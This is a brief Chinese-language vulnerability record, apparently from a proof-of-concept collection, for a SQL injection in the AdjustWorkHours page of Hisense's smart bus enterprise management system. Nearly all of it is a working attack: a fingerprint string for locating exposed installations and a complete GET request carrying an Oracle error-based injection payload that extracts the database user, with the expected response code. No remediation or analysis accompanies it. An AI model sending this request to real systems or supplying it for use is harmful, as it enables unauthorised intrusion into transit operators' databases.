# Hisense-海信公交智能公交企业管理系统AdjustWorkHours存在Sql注入漏洞

Hisense ｜ SQL注入 ｜ —
- **指纹**：`"HisModules/ErpAdmin/RoleMng/Js/selectDefaultRole.js"`
- **请求**：`GET /YZSoft/Forms/XForm/BM/MaintainComManagement/AdjustWorkHours.aspx?key=-1%27%20and%20(select%20dbms_xdb_version.checkin((select%20user%20from%20dual))%20from%20dual)is%20not%20null-- HTTP/1.1`
- **响应特征**：200